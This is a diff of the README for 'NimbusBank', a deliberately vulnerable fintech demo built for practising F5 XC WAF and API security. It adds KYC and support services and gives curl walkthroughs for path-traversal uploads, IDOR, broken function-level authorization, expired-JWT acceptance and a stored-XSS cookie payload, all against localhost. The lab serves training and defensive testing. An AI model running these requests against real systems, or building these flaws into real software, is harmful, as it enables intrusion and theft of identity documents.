@@ -3,14 +3,14 @@
 A deliberately-vulnerable fintech demo app, built to practice F5 Distributed
 Cloud (F5 XC) WAF and API Security features against: JWT validation at the
 edge, OpenAPI schema validation, rate limiting, and bot/malicious-user
-detection. **Phase 0 + Phase 1 are done** — three independent FastAPI
-microservices (auth, accounts, transfers), each owning its own Postgres
-database, fronted by a single Nginx gateway that also serves the React SPA.
-No rate limiting, no WAF, no schema enforcement anywhere — on purpose. Next
-up: point F5 XC at the gateway and layer those in.
+detection. **Phase 0 + Phase 1 + Phase 2 are done** — five independent FastAPI
+microservices (auth, accounts, transfers, kyc, support), each owning its own
+Postgres database, fronted by a single Nginx gateway that also serves the
+React SPA. No rate limiting, no WAF, no schema enforcement anywhere — on
+purpose. Next up: point F5 XC at the gateway and layer those in.
 
 Unlike [VulnCart](../vulncart) (a monolith bot-defense demo), NimbusBank is a
-true microservices split — three separate FastAPI services, three separate
+true microservices split — five separate FastAPI services, five separate
 Postgres databases, **no cross-service database access, ever**. Services
 that need to trust something about a request (who the caller is) do it the
 way F5 XC itself does: by validating a JWT's signature against a JWKS
@@ -43,6 +43,16 @@ Summary, mapped to F5 XC's attack/feature categories:
 | BOLA — `GET /transfers?account_id=` has no ownership check | `services/transfers/app/main.py` (`list_transfers`) | API Security: Broken Object Level Authorization |
 | Stored XSS — `memo` rendered via `dangerouslySetInnerHTML` | `services/transfers/app/models.py` + `frontend/src/pages/TransactionHistory.jsx` | WAF / OWASP Top 10: Stored XSS |
 | BFLA — admin-only route uses `get_current_user`, not `require_admin` | `services/transfers/app/main.py` (`admin_override`) | API Security: Broken Function Level Authorization |
+| Malicious file upload — no type/extension/magic-byte/AV check, any file accepted | `services/kyc/app/main.py` (`upload_document`) | API Security / WAF: Malicious File Upload |
+| Path traversal on write — client filename used unsanitized in the on-disk path | `services/kyc/app/main.py` (`upload_document`) | API Security / WAF: Path Traversal |
+| No upload size cap — arbitrarily large bodies read into memory + written | `services/kyc/app/main.py` (`upload_document`) | API Security: unthrottled business logic / DoS |
+| IDOR — read/download any customer's KYC doc by sequential id, no ownership check | `services/kyc/app/main.py` (`get_document`, `download_document`) | API Security: Broken Object Level Authorization |
+| BFLA + PII exposure — `GET /kyc/pending` uses `get_current_user`, not `require_admin`; any customer enumerates every customer's identity docs | `services/kyc/app/main.py` (`list_pending`) | API Security: BFLA + Sensitive Data Exposure |
+| BFLA — any customer can approve/reject anyone's KYC | `services/kyc/app/main.py` (`review_document`) | API Security: Broken Function Level Authorization |
+| Inconsistent JWT validation — support skips `exp` (`verify_exp: False`); expired tokens still accepted here while every other service rejects them | `services/support/app/security.py` (`get_current_user`) | API Security: Broken Authentication / improper JWT validation |
+| IDOR — read any ticket + its messages / post to any ticket by sequential id | `services/support/app/main.py` (`get_ticket`, `post_message`) | API Security: Broken Object Level Authorization |
+| BFLA — `GET /tickets/all` agent console has no role check | `services/support/app/main.py` (`list_all_tickets`) | API Security: Broken Function Level Authorization |
+| Stored XSS / formjacking — ticket `body` rendered via `dangerouslySetInnerHTML` in the agent console | `services/support/app/models.py` + `frontend/src/pages/AgentConsole.jsx` | WAF / OWASP Top 10: Stored XSS |
 | No `limit_req` zone anywhere | `gateway/nginx.conf` | Unthrottled surface for every endpoint above |
 
 What's **not** intentionally broken: passwords are bcrypt-hashed, access
@@ -173,6 +183,76 @@ curl -s -X POST http://localhost/api/transfers/transfers/admin-override \
 # succeeds even though $TOKEN belongs to a "customer", not an "admin"
 ```
 
+**Malicious file upload + path-traversal-on-write — upload any file with a
+booby-trapped name** (the full gateway path is `/api/kyc/kyc/...` — the
+repeated `kyc` is correct, same URL shape as accounts/transfers):
+
+```bash
+# An EICAR-style / arbitrary file sails through — no type, extension, magic-byte
+# or AV check. The multipart `filename` is used unsanitized to build the on-disk
+# path, so a "../"-laden name escapes the uploads/ directory on write.
+printf 'X5O!P%%@AP[4\\PZX54(P^)7CC)7}$EICAR' > /tmp/evil.com
+curl -s -X POST http://localhost/api/kyc/kyc/upload \
+  -H "Authorization: Bearer $TOKEN" \
+  -F 'doc_type=id_card' \
+  -F 'file=@/tmp/evil.com;filename=../../../../tmp/pwned_by_kyc.txt' | jq
+# -> stored_path lands OUTSIDE services/kyc/app/uploads/ ; nothing scanned it
+```
+
+**KYC IDOR — read (and download) another customer's identity document by id:**
+
+```bash
+curl -s http://localhost/api/kyc/kyc/1 -H "Authorization: Bearer $TOKEN" | jq
+# metadata for a doc you don't own — no ownership check, sequential ids
+curl -s http://localhost/api/kyc/kyc/1/download -H "Authorization: Bearer $TOKEN"
+# streams back the raw file (incl. anything uploaded above, unscanned)
+```
+
+**KYC BFLA + PII exposure — the compliance queue with a plain customer token:**
+
+```bash
+curl -s http://localhost/api/kyc/kyc/pending -H "Authorization: Bearer $TOKEN" | jq
+# every user's pending identity documents — meant to be compliance-officer-only,
+# but guarded by get_current_user, not require_admin
+
+# Same gap on the review action: approve anyone's KYC as a non-admin customer
+curl -s -X POST http://localhost/api/kyc/kyc/1/review \
+  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
+  -d '{"status":"approved"}' | jq
+```
+
+**Support IDOR — read a ticket (and its messages) that isn't yours:**
+
+```bash
+curl -s http://localhost/api/support/tickets/1 -H "Authorization: Bearer $TOKEN" | jq
+# any ticket id 1..N, regardless of who you logged in as
+curl -s http://localhost/api/support/tickets/all -H "Authorization: Bearer $TOKEN" | jq
+# the whole "agent console" list — no role check
+```
+
+**Support stored XSS / formjacking — plant a payload in a ticket message, then
+open the agent console:**
+
+```bash
+curl -s -X POST http://localhost/api/support/tickets/1/messages \
+  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
+  -d '{"sender":"customer","body":"<img src=x onerror=alert(document.cookie)>"}' | jq
+# then visit http://localhost/support/agent in a browser — it renders message
+# bodies with dangerouslySetInnerHTML, so the payload fires in the agent's tab
+```
+
+**Inconsistent JWT validation — an expired token still works against support:**
+
+```bash
+# Mint a short-lived token (JWT_EXPIRE_MINUTES controls access-token lifetime),
+# wait for it to expire, then compare the two services:
+curl -s http://localhost/api/support/tickets -H "Authorization: Bearer $EXPIRED"
+# -> 200: support skips the exp check (verify_exp=False in its security.py)
+curl -s -o /dev/null -w "%{http_code}\n" \
+  http://localhost/api/accounts/accounts -H "Authorization: Bearer $EXPIRED"
+# -> 401: accounts (and auth, transfers, kyc) validate exp correctly
+```
+
 ## Money movement, FX, and TOTP
 
 These are real features layered on top of the deliberately-vulnerable core —
@@ -267,20 +347,23 @@ curl -s -X POST http://localhost/api/auth/login/totp/verify -H "Content-Type: ap
 ## Stack
 
 - **Postgres 16**, one container, five databases: `auth`, `accounts`,
-  `transfers` (all in use) plus empty `kyc` and `support` (Phase 2 — see
-  Roadmap). Each service connects to exactly one database and never touches
-  another's.
+  `transfers`, `kyc`, `support` — all in use as of Phase 2. Each service
+  connects to exactly one database and never touches another's.
 - **auth-service** (FastAPI, async SQLAlchemy + asyncpg) — users, login,
   OTP, and JWT/JWKS issuance. The only service holding the RS256 private
   key (2048-bit, generated on first boot, persisted in a docker volume).
-- **accounts-service** / **transfers-service** (FastAPI) — validate bearer
-  tokens by fetching auth-service's public JWKS over the internal docker
-  network; hold no signing key of their own.
+- **accounts-service** / **transfers-service** / **kyc-service** /
+  **support-service** (FastAPI) — validate bearer tokens by fetching
+  auth-service's public JWKS over the internal docker network; hold no
+  signing key of their own. (support-service deliberately skips the token's
+  `exp` check — see its `security.py` and the vulnerability table.)
+  kyc-service adds multipart file upload (`python-multipart`) and stores files
+  under `services/kyc/app/uploads/`.
 - **React** (Vite) — SPA, built and served as static files.
 - **Nginx** — single entry point: serves the built frontend and reverse
-  proxies `/api/auth/`, `/api/accounts/`, `/api/transfers/` to the three
-  services. This is also where F5 XC slots in later — point your XC origin
-  pool at this Nginx, no app changes required.
+  proxies `/api/auth/`, `/api/accounts/`, `/api/transfers/`, `/api/kyc/`,
+  `/api/support/` to the five services. This is also where F5 XC slots in
+  later — point your XC origin pool at this Nginx, no app changes required.
 
 A note on URL shape: each service's own routes already include their
 resource name (e.g. accounts-service defines `GET /accounts/{id}`, not just
@@ -307,6 +390,8 @@ correct; see `gateway/nginx.conf` and each service's `main.py`.
    curl http://localhost/api/auth/health
    curl http://localhost/api/accounts/health
    curl http://localhost/api/transfers/health
+   curl http://localhost/api/kyc/health
+   curl http://localhost/api/support/health
    ```
 4. Visit `http://localhost/` in a browser: register an account (or sign in
    as one of the seeded users below), view your dashboard, open an account,
@@ -335,10 +420,11 @@ pip install -r requirements.txt
 export DATABASE_URL=postgresql+asyncpg://nimbusbank:change_me_please@localhost:5432/auth
 uvicorn app.main:app --reload --port 8001
 ```
-(Repeat for `services/accounts` on port 8002 and `services/transfers` on
-port 8003, each with its own `DATABASE_URL` pointing at `accounts` /
-`transfers`. Easiest is `docker compose up db` for a local Postgres with all
-five databases already created.)
+(Repeat for `services/accounts` on 8002, `services/transfers` on 8003,
+`services/kyc` on 8004, and `services/support` on 8005, each with its own
+`DATABASE_URL` pointing at `accounts` / `transfers` / `kyc` / `support`.
+Easiest is `docker compose up db` for a local Postgres with all five
+databases already created.)
 
 ## Seeded test data
 
@@ -372,6 +458,14 @@ share one currency, so cross-user transfers exercise FX conversion:
 Three seeded transfers exist between accounts 3, 5, 7, and 9 so the
 transaction history view isn't empty on first load.
 
+kyc-service seeds three KYC documents (sequential ids 1-3: two for alice, one
+for bob), with tiny placeholder files written into
+`services/kyc/app/uploads/` at seed time so the download route serves
+something real out of the box. Two are `pending`, so `GET /kyc/pending` has
+rows to leak. support-service seeds two tickets (ids 1-2: alice's card issue,
+bob's 2FA question) with a few messages each, so the customer view and the
+agent console aren't empty.
+
 All five seeded users stay on the weak echoed-OTP login path out of the box
 (`totp_enabled = false`) so the curl flows above keep working. Real
 authenticator-app (TOTP) enrollment is opt-in per user via the Security page
@@ -389,17 +483,21 @@ seeding convenience only, not a runtime dependency between the databases.
 2. ~~accounts-service: balances, BOLA, mass assignment, SQLi, path traversal, SSRF~~ — done
 3. ~~transfers-service: money movement, BOLA, stored XSS, BFLA~~ — done
 4. ~~React frontend + Nginx gateway~~ — done
-5. **Phase 2:** `kyc-service` and `support-service` (databases already
-   created, empty, by `postgres/init-multi-db.sh`), plus a walkthrough of
-   uploading each service's `/openapi.json` to F5 XC's API schema
-   validation feature.
+5. ~~**Phase 2:** `kyc-service` (file upload, path-traversal-on-write, KYC
+   IDOR download, BFLA compliance queue + PII) and `support-service`
+   (ticket IDOR, stored XSS / formjacking in the agent console, inconsistent
+   JWT validation / expired-token-accepted), each with a clean
+   `/openapi.json`~~ — done. Still to do: the walkthrough of uploading each
+   service's `/openapi.json` to F5 XC's API schema validation feature.
 6. **Phase 3:** bot scripts against `/login`, `/login/otp/verify`, and
    `/register` (plain HTTP + a headless-browser variant), similar in spirit
    to VulnCart's `vulncart-bots/`.
-7. **Phase 4:** a malware/malicious-file-upload demo (likely attached to
-   `support-service` once it exists).
-8. **Phase 5:** client-side defense / formjacking demo against the React
-   frontend.
+7. ~~**Phase 4:** a malware/malicious-file-upload demo~~ — done, attached to
+   `kyc-service`'s `POST /kyc/upload` (no type/AV check; see the vulnerability
+   table).
+8. ~~**Phase 5:** client-side defense / formjacking demo against the React
+   frontend~~ — done, via the support agent console's raw-HTML render of
+   customer-submitted ticket messages.
 9. **Phase 6:** an aggregated admin dashboard across all services.
 10. **Phase 7:** split across multiple environments for a realistic
     multi-environment F5 XC deployment (e.g. separate XC namespaces for
